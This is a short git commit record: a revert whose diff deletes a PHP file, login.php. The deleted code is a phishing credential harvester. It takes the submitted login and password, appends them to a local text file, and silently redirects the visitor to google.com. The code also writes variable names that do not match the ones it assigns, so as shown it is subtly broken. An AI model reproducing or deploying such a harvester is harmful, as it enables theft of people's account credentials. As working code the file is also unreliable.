56d5443d708befb47b23652a21be95f837a0ad87
Bagdat127 <Bandakz01@gmail.com>
2020-05-17 06:28:39 +0600

    Revert "ЛП"
    This reverts commit 64d7d59418ab22a64a3fcc5bfd9e8dbc603ff282.

--- login.php
+++
@@ -1,8 +0,0 @@
-<?PHP
-$Log = $_POST['login'];
-$Pass = $_POST['pass'];
-$log = fopen("Аккаунт.txt","at");
-fwrite($log,"$Логин:$Пароль\n");
-fclose($log);
-echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://www.google.com/'></head></html>";
-?>
